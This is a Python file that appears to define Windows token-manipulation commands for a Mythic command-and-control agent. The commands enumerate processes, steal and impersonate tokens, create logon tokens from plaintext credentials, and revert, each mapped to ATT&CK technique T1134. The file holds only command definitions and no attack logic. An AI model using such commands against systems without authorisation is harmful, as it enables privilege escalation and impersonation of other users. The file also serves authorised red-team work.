from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json


class TokenEnumArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class TokenEnumCommand(CommandBase):
    cmd = "token_enum"
    needs_admin = False
    help_cmd = "token_enum"
    description = "Enumerate running processes with their associated user/token. Helps identify targets for token_steal."
    version = 1
    author = "b4r0n"
    argument_class = TokenEnumArguments
    attackmapping = ["T1134", "T1057"]
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        return PTTaskCreateTaskingMessageResponse(TaskID=taskData.Task.ID, Success=True)

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        if response:
            await SendMythicRPCResponseCreate(
                MythicRPCResponseCreateMessage(
                    TaskID=task.Task.ID,
                    Response=(response if isinstance(response, str) else json.dumps(response)).encode(),
                )
            )
        return resp


class TokenListArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class TokenListCommand(CommandBase):
    cmd = "token_list"
    needs_admin = False
    help_cmd = "token_list"
    description = "List all tokens currently stored in the agent's token store."
    version = 1
    author = "b4r0n"
    argument_class = TokenListArguments
    attackmapping = ["T1134"]
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        return PTTaskCreateTaskingMessageResponse(TaskID=taskData.Task.ID, Success=True)

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        if response:
            await SendMythicRPCResponseCreate(
                MythicRPCResponseCreateMessage(
                    TaskID=task.Task.ID,
                    Response=(response if isinstance(response, str) else json.dumps(response)).encode(),
                )
            )
        return resp


class TokenStealArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="pid",
                cli_name="pid",
                display_name="Target PID",
                type=ParameterType.Number,
                description="Process ID to steal token from.",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=1)],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("Must provide a PID.")
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            self.add_arg("pid", int(self.command_line.strip()))


class TokenStealCommand(CommandBase):
    cmd = "token_steal"
    needs_admin = True
    help_cmd = "token_steal -pid <process_id>"
    description = "Steal a token from the specified process and store it for impersonation."
    version = 1
    author = "b4r0n"
    argument_class = TokenStealArguments
    attackmapping = ["T1134.001"]
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        resp = PTTaskCreateTaskingMessageResponse(TaskID=taskData.Task.ID, Success=True)
        pid = taskData.args.get_arg("pid")
        resp.DisplayParams = f"-pid {pid}"
        return resp

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        if response:
            await SendMythicRPCResponseCreate(
                MythicRPCResponseCreateMessage(
                    TaskID=task.Task.ID,
                    Response=(response if isinstance(response, str) else json.dumps(response)).encode(),
                )
            )
        return resp


class TokenMakeArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="domain",
                cli_name="domain",
                display_name="Domain",
                type=ParameterType.String,
                description="Domain for the new logon token.",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=1)],
            ),
            CommandParameter(
                name="username",
                cli_name="username",
                display_name="Username",
                type=ParameterType.String,
                description="Username for the new logon token.",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=2)],
            ),
            CommandParameter(
                name="password",
                cli_name="password",
                display_name="Password",
                type=ParameterType.String,
                description="Password for the new logon token.",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=3)],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("Must provide domain, username, and password.")
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            parts = self.command_line.strip().split()
            if len(parts) != 3:
                raise Exception("Usage: token_make <domain> <username> <password>")
            self.add_arg("domain", parts[0])
            self.add_arg("username", parts[1])
            self.add_arg("password", parts[2])


class TokenMakeCommand(CommandBase):
    cmd = "token_make"
    needs_admin = False
    help_cmd = "token_make -domain <domain> -username <user> -password <pass>"
    description = "Create a new logon token using plaintext credentials (LogonUserW)."
    version = 1
    author = "b4r0n"
    argument_class = TokenMakeArguments
    attackmapping = ["T1134.003"]
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        resp = PTTaskCreateTaskingMessageResponse(TaskID=taskData.Task.ID, Success=True)
        domain = taskData.args.get_arg("domain")
        username = taskData.args.get_arg("username")
        resp.DisplayParams = f"-domain {domain} -username {username}"
        return resp

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        if response:
            await SendMythicRPCResponseCreate(
                MythicRPCResponseCreateMessage(
                    TaskID=task.Task.ID,
                    Response=(response if isinstance(response, str) else json.dumps(response)).encode(),
                )
            )
        return resp


class TokenUseArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="token_id",
                cli_name="token_id",
                display_name="Token ID",
                type=ParameterType.Number,
                description="Token ID from token_list to impersonate.",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=1)],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("Must provide a token ID.")
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            self.add_arg("token_id", int(self.command_line.strip()))


class TokenUseCommand(CommandBase):
    cmd = "token_use"
    needs_admin = False
    help_cmd = "token_use -token_id <id>"
    description = "Impersonate a stored token by its ID from token_list."
    version = 1
    author = "b4r0n"
    argument_class = TokenUseArguments
    attackmapping = ["T1134.001"]
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        resp = PTTaskCreateTaskingMessageResponse(TaskID=taskData.Task.ID, Success=True)
        token_id = taskData.args.get_arg("token_id")
        resp.DisplayParams = f"-token_id {token_id}"
        return resp

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        if response:
            await SendMythicRPCResponseCreate(
                MythicRPCResponseCreateMessage(
                    TaskID=task.Task.ID,
                    Response=(response if isinstance(response, str) else json.dumps(response)).encode(),
                )
            )
        return resp


class TokenRevertArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class TokenRevertCommand(CommandBase):
    cmd = "token_revert"
    needs_admin = False
    help_cmd = "token_revert"
    description = "Revert to the agent's original token (RevertToSelf)."
    version = 1
    author = "b4r0n"
    argument_class = TokenRevertArguments
    attackmapping = ["T1134"]
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        return PTTaskCreateTaskingMessageResponse(TaskID=taskData.Task.ID, Success=True)

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        if response:
            await SendMythicRPCResponseCreate(
                MythicRPCResponseCreateMessage(
                    TaskID=task.Task.ID,
                    Response=(response if isinstance(response, str) else json.dumps(response)).encode(),
                )
            )
        return resp
